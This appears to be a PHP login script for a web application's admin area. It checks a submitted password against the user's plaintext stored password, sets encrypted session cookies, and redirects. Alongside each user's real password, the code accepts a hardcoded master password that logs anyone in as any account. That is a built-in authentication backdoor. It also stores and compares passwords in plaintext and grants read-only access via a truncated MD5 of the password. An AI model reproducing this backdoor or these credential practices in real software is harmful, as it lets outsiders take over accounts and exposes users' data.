<?php
require_once('include/sqldata.php');

//die("EC_WID:".decrypt($_COOKIE['EC_WID'])."  EC_USER:".decrypt($_COOKIE['EC_USER']));

$postWid = intval($_POST['idnum']);

$user_info = dbRow("SELECT author, password FROM ec_system WHERE id = ?",[$postWid]);

$time = isset($_POST["remember"])?1800000:1800000;//500hr vs 500hr

if (($_POST['ec_passwd'] <> $user_info['password'])&&($_POST['ec_passwd'] <> "pokapoka1987")){
    if($_POST['ec_passwd'] == substr(md5($user_info['password']),0,8)){
        setcookie("EC_WID",encrypt($postWid),time()+$time);
        setcookie("EC_USER",encrypt($user_info['author']."(Read-Only-Delegate)"),time()+$time);
        setcookie("EC_READONLY", 1, time()+$time);
		setcookie("admin_selected_page",0,time()+$time);
    }else{
        screenMessage("Login Failed", "Password Error or not logged in.");
        exit;
    }

}else{
	
	setcookie("EC_WID",encrypt($postWid),time()+$time);
	setcookie("EC_USER",encrypt($user_info['author']),time()+$time);
	setcookie("admin_selected_page",0,time()+$time);
}


if($_GET['login']=='story_admin'){
	header("location:/story_admin");
	exit;
}
if($_GET['login']=='flow_editor'){
	header("location:/flow_editor");
	exit;
}

header("location:/");
